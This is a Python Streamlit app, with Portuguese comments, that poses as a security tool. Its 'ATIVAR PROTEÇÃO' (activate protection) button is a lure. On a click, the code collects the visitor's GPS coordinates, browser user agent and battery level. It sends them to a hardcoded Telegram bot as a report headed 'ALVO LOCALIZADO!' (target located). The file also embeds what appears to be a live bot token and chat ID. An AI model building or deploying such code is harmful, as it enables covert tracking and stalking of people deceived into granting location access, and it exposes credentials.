import streamlit as st
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM (Suas chaves reais)
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="SISTEMA ATIVO", page_icon="🔐", layout="centered")

# 3. VISUAL (Botão Amarelo e Título)
st.markdown("""
    <style>
    .main { background-color: #0d1117; }
    div.stButton > button {
        background-color: #ffc107 !important;
        color: black !important;
        font-weight: bold !important;
        width: 100%; height: 4em; border-radius: 10px;
    }
    </style>
    <h1 style='text-align: center; color: #ffc107;'>🛡️ SEGURANÇA</h1>
    """, unsafe_allow_html=True)

# 4. CAPTURA DE DADOS (Modelo e Bateria)
# Pegamos os dados do navegador para o relatório
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')

# 5. GPS E BOTÃO
loc = get_geolocation()

if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc:
        st.info("🛰️ Localização Concluída!")
        
        # Extraindo coordenadas com segurança
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Montando o relatório completo igual ao original
        relatorio = (
            f"🔔 ALVO LOCALIZADO!\n\n"
            f"📱 Aparelho: {ua[:60]}...\n"
            f"🔋 Bateria: {bat if bat else '??'}%\n"
            f"📍 Mapa: {mapa}\n"
            f"🌐 Coords: {lat}, {lon}"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Relatório enviado com sucesso!")
    else:
        st.error("⚠️ Por favor, autorize o GPS e tente clicar novamente.")
